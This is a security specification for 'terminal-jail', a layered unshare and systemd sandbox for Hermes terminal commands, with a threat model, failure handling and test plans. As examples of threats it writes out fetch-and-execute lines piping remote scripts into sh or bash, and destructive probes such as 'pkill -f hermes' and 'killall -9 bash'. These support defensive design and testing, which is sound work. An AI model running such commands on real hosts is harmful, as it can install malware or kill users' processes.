# Terminal-Jail Integration Specification

## Purpose

Terminal-jail is a defense-in-depth containment system for terminal commands. It deliberately uses three independently deployable layers:

1. **Hermes plugin** — intercepts Hermes terminal commands through the `terminal.command.transform` hook and wraps them in `unshare`.
2. **Standalone CLI** — the `terminal-jail` Bash wrapper for commands launched manually or by non-Hermes automation.
3. **systemd service hardening** — the `90-terminal-jail-hardening.conf` drop-in for `hermes-gateway.service`, providing service-manager and kernel-enforced restrictions.

No layer is assumed to be perfect or universally available. The intended security property is that a command must bypass *multiple, differently implemented enforcement points* to affect the host, other users' processes, host-visible files, or the network.

This document specifies how the layers compose, the threats they address, failure/degradation behavior, installation and upgrade order, and validation of the complete stack.

## Security goals

The full stack is designed to:

- prevent commands in a contained session from signaling or killing host processes;
- limit blast radius from accidental destructive commands such as `killpg`, `killall`, and `pkill`;
- contain process multiplication and reduce fork-bomb impact;
- prevent privilege gain by processes started from the Hermes gateway;
- reduce visibility into unrelated host processes through `/proc`;
- restrict package-install and shell-pipeline malware from modifying host-visible files;
- prevent sandboxed processes from opening arbitrary network sockets;
- retain useful command execution in environments where one or more enforcement mechanisms are unavailable.

## Non-goals and assumptions

Terminal-jail is a containment boundary, not a complete host security architecture.

- It does not make untrusted native code safe against a kernel exploit.
- It does not remove trust from the account running `hermes-gateway.service`; correct systemd service identity and file ownership remain prerequisites.
- It does not prevent all data exfiltration if a permitted network path, mounted secret, host IPC mechanism, or credential is deliberately exposed to the sandbox.
- It does not protect commands intentionally run outside both the Hermes plugin and `terminal-jail` CLI.
- It does not replace image hardening, dependency provenance, secret management, mandatory access control, patching, logging, or monitoring.
- `unshare` isolation requires kernel/user-namespace support and an implementation that verifies requested namespaces were actually created.
- The exact availability of filesystem, PID, and mount isolation depends on the flags and mounts selected by the plugin and CLI implementations. This specification requires their policy to be equivalent where both are available.

## Layer composition

```mermaid
flowchart TB
    U[Command source]
    H[Hermes session]
    M[Manual shell / automation]

    H --> P[Hermes plugin\nterminal.command.transform]
    P -->|wrap command| US1[unshare sandbox]

    M --> C[terminal-jail CLI\nBash wrapper]
    C -->|wrap command| US2[unshare sandbox]

    subgraph S[hermes-gateway.service]
      P
      US1
    end

    SD[systemd drop-in\n90-terminal-jail-hardening.conf]
    SD -->|NoNewPrivileges| S
    SD -->|ProtectProc| S
    SD -->|TasksMax| S
    SD -->|RestrictAddressFamilies| S
    SD -->|other systemd hardening| S

    US1 --> K[Kernel namespace and mount enforcement]
    US2 --> K
    SD --> K

    K --> R[Contained command execution]
```

### Composition rules

| Layer | Entry point covered | Primary enforcement | Independent value |
|---|---|---|---|
| Hermes plugin | Commands launched by Hermes terminal sessions | Command transformation into an `unshare` sandbox | Protects normal agent/tool command paths even when users do not remember to invoke the CLI. |
| Standalone CLI | Interactive commands and scripts explicitly invoked as `terminal-jail ...` | `unshare` sandbox equivalent to plugin policy | Provides the same containment policy outside Hermes and acts as a practical fallback for a missing plugin. |
| systemd drop-in | The Hermes gateway process tree, including plugin-launched processes | cgroup resource limits and systemd/kernel service restrictions | Applies regardless of individual command syntax and supplies controls that namespace-only wrappers do not provide. |

The plugin and CLI must not be treated as mutually exclusive. A command that enters Hermes is expected to be transformed by the plugin, while the gateway service's systemd confinement constrains the resulting process tree. A manual command launched through `terminal-jail` receives CLI namespace confinement; if that command is launched from a process already in the hardened gateway service, systemd controls also apply.

The systemd layer is intentionally broader than either wrapper. It is attached to the service process tree and cannot be bypassed merely by supplying a different executable, a shell metacharacter sequence, or a direct binary path after the service has started. Conversely, systemd does not protect an unrelated terminal session outside `hermes-gateway.service`; that is why the CLI remains necessary for manual use.

## Control mapping and attack coverage

### PID namespace containment: `killpg`, `killall`, and `pkill`

All three layers participate in protection against indiscriminate process signaling:

- The Hermes plugin uses `unshare` PID namespace isolation for terminal commands launched in Hermes sessions.
- The `terminal-jail` CLI uses the same PID namespace policy for manual invocation.
- The systemd service confines the Hermes process tree and supplies the final service boundary. The PID namespace restriction is supplied by the wrapper when applicable; systemd protects the gateway process tree from resource and privilege side effects and must be configured not to broaden process visibility.

Inside a correctly created PID namespace, process-discovery and signal tools only see processes in that namespace. `killpg(1)`, `killall`, and `pkill` therefore cannot target arbitrary host process groups or host PIDs that are not namespace-visible. A process can still signal processes within its own namespace when ordinary Unix permission rules allow it. This is expected: PID namespaces reduce host blast radius; they do not prohibit process management inside the sandbox.

### Fork bombs

PID namespaces confine the immediate process tree created by plugin and CLI command wrappers. The systemd layer adds `TasksMax` for `hermes-gateway.service`, constraining the number of tasks the gateway service cgroup may create.

Both controls are needed:

- PID namespace isolation narrows what a runaway process can observe and affect.
- `TasksMax` is the quantitative backstop against process exhaustion from a fork bomb or aggressive worker spawning.

`TasksMax` must be set to a value consistent with normal Hermes concurrency, subprocess use, and legitimate build/test workloads. The selected limit must be documented in the drop-in and regularly tested under expected peak load. It is a containment limit, not a substitute for host-level cgroup policy.

### Privilege escalation: `sudo`, setuid, file capabilities, and exec transitions

`NoNewPrivileges=yes` in the systemd drop-in prevents the gateway service and its descendants from gaining additional privileges through exec. This blocks common privilege escalation paths involving setuid/setgid binaries and file capabilities for processes in the service tree.

The plugin and CLI do not independently provide an equivalent guarantee. Their role is to reduce the reachable filesystem and process surface; the systemd drop-in is the authoritative privilege-gain control.

`NoNewPrivileges` does not make credentials harmless. A process that is already privileged, has access to a delegated privileged daemon/socket, or is supplied a valid credential may still be able to perform authorized actions. Do not mount Docker sockets, host root filesystems, privileged IPC endpoints, or reusable production credentials into the service sandbox.

### `/proc` snooping

`ProtectProc` in the systemd drop-in restricts process visibility through `/proc`, reducing exposure of unrelated process command lines, environment-derived metadata, and PID discovery. The intended mode must hide unrelated processes from the service account while preserving only the visibility required for gateway operation.

PID namespaces in the plugin and CLI also reduce process visibility for wrapped commands. `ProtectProc` is the broader and more reliable service-level backstop because it applies to the gateway process tree rather than only to individual wrapped commands.

Neither control should be relied on as a secret-management mechanism. Process command lines and environments must not contain long-lived secrets in the first place.

### Package malware and `curl | sh`

The plugin and CLI filesystem isolation policies contain untrusted package installers and shell pipelines such as:

```text
pip install <untrusted-package>
curl -fsSL https://example.invalid/install.sh | sh
wget -qO- https://example.invalid/bootstrap | bash
```

The namespace wrapper must provide a private, disposable, or otherwise non-host-writable filesystem view. In particular, it must avoid exposing writable host locations that would allow persistence or modification of user configuration, binaries, service unit files, SSH material, or project sources unless explicitly required for the workload.

Filesystem isolation does not prove that a downloaded payload is benign. It reduces host persistence and modification risk. If network access is available, malware may still execute inside the sandbox and attempt exfiltration over permitted channels. The systemd network restriction below is the complementary control.

### Network escapes

`RestrictAddressFamilies` in the systemd drop-in limits the socket address families that `hermes-gateway.service` and descendants may create. The policy must allow only address families required for normal gateway function and deny families that could create unintended network paths, raw sockets, packet sockets, Bluetooth, Netlink mutation paths, or other unnecessary communications.

The drop-in is the authoritative full-service network control. Plugin and CLI filesystem isolation limit the ability of downloaded tools to persist, while systemd constrains their ability to establish unauthorized network channels when they run in the gateway service tree.

A restricted address-family policy is not automatically a universal egress deny. It does not replace firewall rules, proxy policy, DNS policy, service account isolation, or explicit `IPAddressDeny=`/`IPAddressAllow=` policy where those are required. The allowed families must be reviewed alongside the service's actual network requirements.

## Threat model

| Attack vector | Layer(s) that block or contain it | How protection works | Plausible bypass scenario | Residual risk |
|---|---|---|---|---|
| `killpg(1)` targeting the host process group | Plugin, CLI, systemd-composed stack | Plugin/CLI PID namespaces limit visible target processes; systemd constrains the gateway service tree. | Command is run outside both wrappers; namespace creation silently fails; attacker controls a privileged host process. | Sandboxed processes may still kill their own namespace processes; host kernel vulnerabilities remain out of scope. |
| `killall -9 bash` or equivalent broad-name signaling | Plugin, CLI, systemd-composed stack | PID namespace makes unrelated host `bash` processes unavailable to name-based process discovery. | Wrapper is bypassed, malformed, or fails open; the target is in the same namespace. | In-namespace processes with matching names can be killed. |
| `pkill -f hermes` | Plugin, CLI, systemd-composed stack | PID namespace hides host/gateway process targets from the wrapped command; service hardening limits impact on gateway descendants. | Command is launched directly on host; `/proc` or PID namespace policy is absent; legitimate target resides in sandbox. | Denial of service remains possible against sandbox-local processes. |
| Fork bomb / excessive subprocess spawning | Plugin, CLI, systemd | PID namespace contains scope; systemd `TasksMax` caps task creation in `hermes-gateway.service`. | Attack runs outside hardened service; `TasksMax` is unset/too high; host-wide PID limits are weak. | The service can still consume up to its configured task and CPU/memory allocation; use system resource controls and monitoring. |
| `sudo`, setuid binary, file capability privilege gain | systemd | `NoNewPrivileges=yes` prevents gaining privilege across exec in the service tree. | Process starts already privileged; service exposes privileged IPC/socket; administrator intentionally permits escalation. | Valid credentials and authorized privileged services remain powerful; do not expose them. |
| `/proc` inspection of unrelated processes | systemd, plugin, CLI | `ProtectProc` hides/restricts process metadata; PID namespace narrows wrapped command visibility. | Systemd is unavailable/misconfigured; command runs outside service and wrappers; host permits alternative observability interfaces. | Metadata for permitted/same-namespace processes may remain visible. |
| Malicious `pip` package modifies host files | Plugin, CLI; systemd reduces service privilege | Filesystem namespace/mount policy prevents writes to host-visible persistent paths. | Writable host bind mount, home directory, project directory, cache, socket, or shared volume is exposed; command is run outside wrapper. | Payload can alter sandbox-visible data or build artifacts intentionally mounted writable. |
| `curl | sh` persistence or bootstrap script | Plugin, CLI; systemd | Filesystem isolation limits persistence; service privilege restrictions limit escalation. | Internet access and a writable shared host mount remain available; direct host shell is used. | Payload can execute in sandbox and attack allowed resources. |
| Network escape, arbitrary socket creation | systemd | `RestrictAddressFamilies` denies unnecessary socket families for the service process tree. | Required `AF_INET`/`AF_INET6` is allowed and no egress firewall exists; command runs outside service. | Traffic over allowed families/endpoints can remain possible; apply egress filtering for stronger control. |
| Namespace escape via kernel vulnerability | None fully; all reduce attack surface | Layering reduces privileges, files, process visibility, and networking available to exploit code. | Exploit targets vulnerable kernel or privileged helper. | Kernel compromise is high impact; patch kernel, minimize exposed namespaces/capabilities, use MAC/VM boundaries for hostile code. |
| Direct manual command not prefixed with `terminal-jail` | Plugin only for Hermes; otherwise none | Hermes plugin catches commands issued through Hermes. | User runs a command in an ordinary host shell outside Hermes and without CLI. | Full host impact is possible; provide shell aliases, documentation, training, and consider stronger account/container isolation. |
| Plugin disabled or unavailable | CLI and systemd where used | CLI explicitly wraps manual calls; systemd continues hardening the gateway service. | Manual command bypasses CLI; Docker lacks systemd. | Namespace containment depends on operator use of CLI. |
| systemd absent, including many Docker deployments | Plugin and CLI | Both wrappers can still use `unshare` namespace and filesystem isolation independently. | `unshare` is unavailable or unsupported; wrapper fails open. | No `NoNewPrivileges`, `ProtectProc`, `TasksMax`, or address-family restriction from systemd. |
| `unshare` unavailable or not on `PATH` | Graceful degradation logic in all layers | Layer detects unavailability and follows the configured fail-safe policy rather than executing an unexpectedly unsandboxed command. | Implementation fails open by blindly executing original command. | If policy allows execution, no namespace containment exists; systemd controls may still apply for Hermes gateway. |

## Graceful degradation

Graceful degradation means that a missing optional layer must be detectable, logged, and handled according to an explicit policy. It must never be mistaken for successful sandboxing.

The default security posture for commands explicitly requested to be sandboxed is **fail closed**: if the wrapper cannot establish required isolation, it returns a clear error and does not run the original command. Administrators may choose an explicitly documented development-only fail-open mode, but it must produce a prominent warning identifying the missing control and must never be the silent default.

### Graceful degradation matrix

| Condition | Plugin behavior | CLI behavior | systemd behavior | Effective protection | Required operator action |
|---|---|---|---|---|---|
| All layers installed and healthy | Transforms Hermes terminal commands into `unshare`. | Wraps explicit manual invocations in equivalent `unshare`. | Applies service-level privilege, `/proc`, task, and socket-family restrictions. | Full intended defense-in-depth. | Run periodic verification checklist. |
| Plugin not installed or disabled | Hermes commands are not transformed by the plugin. | `terminal-jail ...` still supplies namespace/filesystem isolation for commands explicitly invoked through it. | Still constrains `hermes-gateway.service` if deployed. | CLI plus service hardening; automatic Hermes command coverage is lost. | Install/repair plugin. Until then, invoke CLI for command execution. |
| CLI not installed or not used | Hermes sessions remain transformed by plugin. | No protection for ordinary manual host-shell commands. | Still constrains gateway process tree. | Plugin plus service hardening for Hermes sessions only. | Install CLI and require it for manual/high-risk work. |
| systemd unavailable, such as Docker without systemd | Plugin still transforms Hermes commands if `unshare` is available. | CLI still wraps commands if `unshare` is available. | Drop-in cannot apply. | Namespace/filesystem isolation from plugin/CLI; no service-level `NoNewPrivileges`, `ProtectProc`, `TasksMax`, or `RestrictAddressFamilies`. | Use container runtime controls (`--pids-limit`, read-only filesystem, dropped capabilities, seccomp, network policy) or run under a systemd-enabled host. |
| `unshare` not on `PATH` | Detect before transforming/executing. Required-isolation mode returns an actionable error. | Detect before executing. Required-isolation mode returns an actionable error. | Systemd hardening remains active for the gateway service. | Systemd-only for Hermes gateway; no wrapper PID/filesystem isolation. | Install/configure `unshare` from util-linux, correct `PATH`, and verify namespace support. |
| `unshare` exists but required namespace creation fails | Do not claim success. Return/log failure in fail-closed mode. | Do not run original command in fail-closed mode. | Systemd hardening remains active for service tree. | Same as prior row unless an explicitly approved development fail-open policy is selected. | Diagnose kernel/user namespace policy, required permissions, and mount setup. |
| Manual command is run directly outside Hermes and without CLI | Not in path. | Not in path. | Not in path unless the shell itself belongs to hardened gateway service. | None of terminal-jail's normal controls. | Use `terminal-jail`, a dedicated unprivileged account/container, or another approved execution environment. |

### Required `unshare` failure semantics

Every wrapper implementation must:

1. resolve `unshare` using an absolute configured path or a verified `PATH` lookup before accepting a command;
2. verify that required `unshare` flags and namespace operations succeed;
3. emit a concise diagnostic naming the missing binary, unsupported kernel setting, permission failure, or mount failure;
4. exit non-zero without running the original command when required isolation cannot be established;
5. avoid shell constructions that retry the original command outside the namespace after a failed `unshare` invocation;
6. make any development-only fail-open switch explicit, opt-in, auditable, and unavailable in production service configuration;
7. record a structured log/metric for failed isolation setup so health monitoring can detect coverage loss.

## Installation procedure

Install from the outermost, service-wide backstop inward:

1. **systemd hardening drop-in**
2. **Hermes plugin**
3. **standalone CLI**

This order matters because it establishes the broadest protection before enabling new execution paths. The systemd drop-in hardens the gateway process tree even if plugin configuration is incomplete, a command transform is faulty, or an operator invokes a binary unexpectedly from inside the service. Installing the plugin next provides automatic coverage for normal Hermes sessions. Installing the CLI last provides an explicit and documented manual-use escape from unsafe direct host-shell execution, without being relied on as the only protection for the gateway.

### Prerequisites

Before installation, confirm that:

- the host runs systemd if service hardening is expected;
- `hermes-gateway.service` is the correct unit name and is managed by systemd;
- `unshare` is installed from util-linux and executable by the relevant service/user account;
- required user and mount namespace features are supported by the kernel and permitted by local policy;
- the gateway service runs as a dedicated, unprivileged account where possible;
- no unnecessary host paths, Docker sockets, credentials, SSH agents, or privileged IPC sockets are exposed to the gateway;
- expected normal workloads are known so `TasksMax` and filesystem mounts do not break legitimate operation.

### Step 1: install and activate the systemd drop-in

1. Place `90-terminal-jail-hardening.conf` in the `hermes-gateway.service.d` drop-in directory used by the deployment.
2. Review the drop-in against the gateway's real operational requirements. In particular, validate `NoNewPrivileges`, `ProtectProc`, `TasksMax`, and `RestrictAddressFamilies` rather than weakening them preemptively.
3. Reload systemd manager configuration.
4. Restart `hermes-gateway.service` in a controlled maintenance window.
5. Inspect the effective unit configuration and service status to confirm the drop-in is loaded.
6. Run the systemd verification commands in this document before proceeding.

Do not continue to plugin rollout if the drop-in is syntactically invalid, not loaded by the target unit, or materially reduces the security score below the required baseline without an approved exception.

### Step 2: install and configure the Hermes plugin

1. Install the terminal-jail Hermes plugin through the approved Hermes plugin mechanism.
2. Configure its `terminal.command.transform` hook to invoke the validated `unshare` wrapper policy.
3. Ensure the plugin runs in fail-closed mode for required isolation and emits a meaningful error when `unshare` is unavailable.
4. Restart or reload the Hermes component required for plugin discovery.
5. Verify that a newly created Hermes session, not merely an already-running session, loads the plugin.
6. Run the plugin verification checklist.

The plugin must preserve command argument boundaries. It must not interpolate a complete shell command through unsafe string concatenation, and it must not permit user-controlled values to alter the wrapper's namespace flags or mount policy.

### Step 3: install the standalone CLI

1. Install the `terminal-jail` executable in a root-owned or otherwise trusted directory on `PATH`.
2. Verify that it resolves the intended `unshare` binary and does not honor unsafe environment-controlled wrapper paths.
3. Document its use for interactive shells, automation, and emergency/manual operations.
4. Optionally provide a shell alias or approved workflow integration, but do not let an alias obscure whether a command was actually sandboxed.
5. Run the CLI verification checklist.

The CLI must pass commands and arguments without lossy re-parsing. The documented interface must make clear whether the command is supplied as argv or a quoted shell snippet, and shell execution must be avoided unless explicitly required and safely handled.

## Upgrade procedure

Upgrade in a controlled sequence that avoids a coverage gap:

1. Review release notes, diffs, and compatibility notes for the systemd drop-in, plugin, CLI, and their `unshare` flags/mount policy.
2. Back up current configuration and record the effective systemd unit settings and plugin configuration. Do not back up or print secrets as part of this process.
3. Upgrade the systemd drop-in first. Reload manager configuration and restart the service only after validating unit syntax and required service dependencies.
4. Verify systemd hardening and normal gateway startup.
5. Upgrade the Hermes plugin and reload/restart the relevant Hermes component.
6. Verify plugin transformation in a fresh Hermes session.
7. Upgrade the CLI binary/script.
8. Verify CLI behavior and argument handling.
9. Execute the full-stack end-to-end test strategy in a non-production environment.
10. Monitor structured errors, service restarts, task-limit events, denied syscall/socket events, and user reports after rollout.

### Rollback procedure

Rollback must preserve the outer service boundary where possible:

1. If a plugin or CLI regression occurs, disable or revert that component while leaving the validated systemd hardening drop-in active.
2. If systemd hardening causes an availability incident, identify the specific incompatible directive and apply the narrowest temporary exception; do not remove the entire drop-in as a first response.
3. Document any temporary reduction in score or coverage, its owner, and an expiry/review date.
4. Re-run all verification checks after rollback to establish the actual remaining protection level.

## Verification checklist

Verification must be run from a controlled non-production environment first. A command returning an error is only meaningful when the error demonstrates sandbox isolation rather than a missing executable, malformed invocation, or service outage. Capture exit code, stderr, and relevant service logs.

### A. Prerequisite and policy checks

- [ ] Confirm `unshare` is available to the Hermes service account and to CLI users.
- [ ] Confirm the plugin and CLI use the same approved namespace and filesystem-isolation policy.
- [ ] Confirm fail-closed behavior when `unshare` cannot be resolved or namespace setup fails.
- [ ] Confirm the gateway service runs under the intended unprivileged account.
- [ ] Confirm no unintended writable host mounts, secrets, Docker socket, or privileged IPC endpoint is exposed to sandboxed commands.
- [ ] Confirm the effective systemd unit includes the terminal-jail drop-in.

### B. Hermes plugin verification

Run the required behavioral probe in a fresh Hermes session:

```text
hermes chat -q "pkill -f hermes"
```

Expected result:

- The command returns an error/non-zero outcome attributable to the sandboxed command being unable to target host-visible Hermes processes.
- The Hermes gateway remains healthy and continues serving subsequent benign requests.
- Logs show that the terminal command transform was applied and, where supported, identify the namespace wrapper execution without exposing sensitive command data unnecessarily.

Additional recommended plugin probes:

- [ ] Run `ps` or a narrowly scoped process-list command in the transformed session and confirm it does not expose unrelated host processes.
- [ ] Attempt a write to a known non-sandbox host path that policy should make unavailable; confirm failure and confirm the host file remains unchanged.
- [ ] Attempt a benign child-process fan-out sized below `TasksMax`; confirm normal execution.
- [ ] Verify command arguments containing spaces, quotes, glob characters, and leading dashes are passed intact and cannot alter wrapper flags.
- [ ] Temporarily test missing `unshare` in an isolated test configuration and confirm the plugin returns a clear error rather than running the command on the host.

Do not use a probe that can terminate the actual gateway or production shell even if isolation fails. In production-like testing, replace destructive target patterns with a disposable process created solely for the test namespace.

### C. Standalone CLI verification

Run the required behavioral probe:

```text
terminal-jail "killall -9 bash"
```

Expected result:

- The command returns an error/non-zero outcome because host `bash` processes are not visible/targetable from the jailed PID namespace, or because no matching in-namespace process exists.
- The invoking host shell remains alive.
- The CLI reports a setup failure instead of executing unsandboxed if `unshare` is unavailable.

Additional recommended CLI probes:

- [ ] Run a process listing inside `terminal-jail` and confirm that unrelated host processes are absent.
- [ ] Attempt to write to a policy-prohibited host location and confirm it fails; independently inspect the location from the host to confirm no modification.
- [ ] Run a harmless `pip` install or simulated installer in a disposable fixture and confirm package/cache writes remain inside the intended sandbox-visible paths.
- [ ] Use an argument-preservation test with spaces, quotes, dollar signs, semicolons, glob patterns, and an argument beginning with `-`.
- [ ] Test missing `unshare` with a test-only PATH and confirm non-zero fail-closed behavior.

### D. systemd hardening verification

Run the required security assessment:

```text
systemd-analyze security hermes-gateway.service
```

Expected result:

```text
Overall exposure level: ...
```

The assessed security score for `hermes-gateway.service` must be **at least 9.0**. Record the exact score, systemd version, and any warnings because scoring heuristics can differ between systemd releases.

Also verify:

- [ ] The effective unit configuration contains `NoNewPrivileges=yes`.
- [ ] The effective unit configuration contains the intended `ProtectProc` setting.
- [ ] The effective unit configuration contains a non-default, documented `TasksMax` value appropriate to the service.
- [ ] The effective unit configuration contains the intended `RestrictAddressFamilies` allowlist/deny policy.
- [ ] A test process launched through the gateway cannot gain privilege through a setuid/file-capability path.
- [ ] A test process cannot inspect unrelated `/proc` entries beyond the selected `ProtectProc` policy.
- [ ] Task-limit events are observable in journal/service monitoring when a controlled test reaches the limit.
- [ ] Socket-creation attempts using an intentionally disallowed address family fail and are observable in logs/audit where available.
- [ ] Normal gateway operations still succeed under the restrictions.

### E. Full-stack verification

- [ ] Start a fresh non-production gateway instance with the systemd drop-in active.
- [ ] Confirm the plugin is loaded in that instance.
- [ ] Execute the required plugin probe: `hermes chat -q "pkill -f hermes"`.
- [ ] Execute the required CLI probe: `terminal-jail "killall -9 bash"`.
- [ ] Confirm `systemd-analyze security hermes-gateway.service` reports a score of at least 9.0.
- [ ] Confirm the host shell, gateway service, and a known unrelated host process remain healthy after all probes.
- [ ] Confirm service logs contain no failed-open namespace initialization event.
- [ ] Confirm no test artifact persists outside approved disposable test paths.

## End-to-end testing without a production Hermes instance

The complete stack must be testable without connecting to production Hermes, production credentials, or production workloads.

### Test environment design

Use a disposable environment with:

- a non-production Linux VM, ephemeral test host, or disposable container/VM combination;
- a dedicated unprivileged test account;
- a test systemd unit named consistently with the target unit where practical (for example, a test copy of `hermes-gateway.service`);
- a minimal local Hermes gateway/plugin fixture, stub, or test harness that loads the real `terminal.command.transform` plugin path but does not contact production services;
- a synthetic, harmless command executor with deterministic logs;
- no production secrets, SSH agents, Docker socket, host mounts, cloud credentials, or shared home directory;
- a separate sentinel host process whose survival can be checked after destructive-name probes;
- a writable disposable workspace and a known host path deliberately excluded from the sandbox for write-denial tests.

If Docker is used for the fixture and systemd is unavailable inside the container, test plugin and CLI namespace behavior there, then run the systemd-specific checks on a disposable systemd-enabled VM or host. Do not represent a Docker-only run as full-stack validation because it cannot validate the systemd layer.

### Test cases

| Test | Setup | Action | Expected result |
|---|---|---|---|
| Plugin process-signal containment | Start non-production gateway with plugin and hardened unit; start external sentinel process. | Invoke `hermes chat -q "pkill -f hermes"`. | Request errors/has no host target effect; gateway and sentinel survive; transform log exists. |
| CLI process-signal containment | Start an ordinary host-shell sentinel. | Invoke `terminal-jail "killall -9 bash"`. | Command errors or finds no host target; invoking host shell survives. |
| PID visibility | Create a uniquely named host sentinel outside sandbox. | Run process-discovery command via plugin and CLI. | Sentinel is absent from sandbox-visible process list. |
| Filesystem write isolation | Define a host path excluded from sandbox mounts. | Attempt write through plugin and CLI. | Write fails; independent host-side check confirms unchanged content. |
| Package/pipeline containment | Use a local harmless package or local HTTP fixture that attempts controlled writes. | Run `pip` installation fixture and a `curl | sh`-style fixture in sandbox. | Only allowed disposable sandbox paths change; prohibited host path remains unchanged. |
| Fork containment | Use a controlled fan-out helper with bounded duration. | Run beneath gateway unit until near/over configured task limit. | New task creation is denied/capped; service and host recover; event is observable. |
| No-new-privileges | Provide a deliberately harmless test setuid/file-capability fixture only in disposable environment. | Execute fixture through hardened gateway path. | Privilege gain does not occur. |
| `/proc` protection | Start external sentinel under another process identity where feasible. | Inspect `/proc` from gateway child. | Visibility matches `ProtectProc` policy and does not disclose unrelated processes. |
| Address-family restriction | Use a small test helper that requests an intentionally disallowed socket family. | Execute through hardened gateway. | Socket creation fails; required gateway networking remains functional. |
| Missing `unshare` | Test-only environment/PATH omits `unshare`. | Invoke plugin and CLI. | Both return clear non-zero setup error; original command is not executed. |
| Missing plugin | Run gateway fixture without plugin but with CLI/systemd available. | Execute command through CLI path. | CLI containment remains effective; test report marks automatic Hermes coverage absent. |
| No systemd environment | Run fixture in Docker without systemd. | Execute plugin and CLI probes. | Namespace/filesystem tests pass if supported; report explicitly marks systemd controls unverified/unavailable. |

### Safety requirements for tests

- Never run `pkill`, `killall`, fork bombs, or privilege probes against a production gateway, shared developer workstation, or host process namespace without verified isolation.
- Prefer unique test process names and disposable sentinels over broad matching patterns.
- Bound every resource test by timeout, maximum child count, and cleanup trap in the test helper.
- Test write-denial behavior against purpose-built fixture paths, never user homes or system configuration.
- Keep a separate host-side observer outside the sandbox to verify sentinels, service health, files, and network traces.
- Treat unexpected command success as a security failure, stop the test, and inspect actual namespace/service configuration before retrying.

## Operational monitoring and evidence

Deployment is not complete without evidence that containment remains active.

Monitor and periodically review:

- plugin initialization and command-transform success/failure events;
- `unshare` resolution and namespace setup failures;
- systemd unit restart failures and rejected service directives;
- `TasksMax`/cgroup task-limit events;
- denied socket or syscall events when auditing is available;
- changes to the effective systemd unit, plugin configuration, CLI wrapper, `PATH`, mount policy, and service account;
- drift in `systemd-analyze security hermes-gateway.service` score from the required 9.0 baseline;
- unexpected writable mounts, attached credentials, or privileged sockets in the gateway execution environment.

Alerting should distinguish between a command that was safely denied by policy and a failure to initialize the policy itself. The latter is a coverage-loss event and requires remediation.

## Acceptance criteria

The integration is acceptable only when all of the following are true:

1. The systemd drop-in is active for `hermes-gateway.service`, and `systemd-analyze security hermes-gateway.service` reports a score of at least 9.0.
2. The drop-in enforces `NoNewPrivileges`, `ProtectProc`, a documented `TasksMax`, and a documented `RestrictAddressFamilies` policy compatible with the service's legitimate operation.
3. The Hermes plugin transforms terminal commands through the approved `unshare` policy in fresh Hermes sessions.
4. The standalone `terminal-jail` CLI applies equivalent required namespace/filesystem isolation for explicit manual invocations.
5. `hermes chat -q "pkill -f hermes"` returns an error without damaging the non-production gateway or host sentinel process.
6. `terminal-jail "killall -9 bash"` returns an error without terminating the invoking host shell.
7. Missing or failing `unshare` produces an explicit non-zero error and never silently executes the original command unsandboxed in production configuration.
8. End-to-end tests verify PID/process containment, filesystem write isolation, task limits, no-new-privilege behavior, `/proc` restrictions, and address-family restrictions in a disposable non-production environment.
9. Any unavailable layer is reported in the deployment/test record, along with the resulting residual risk and compensating controls.
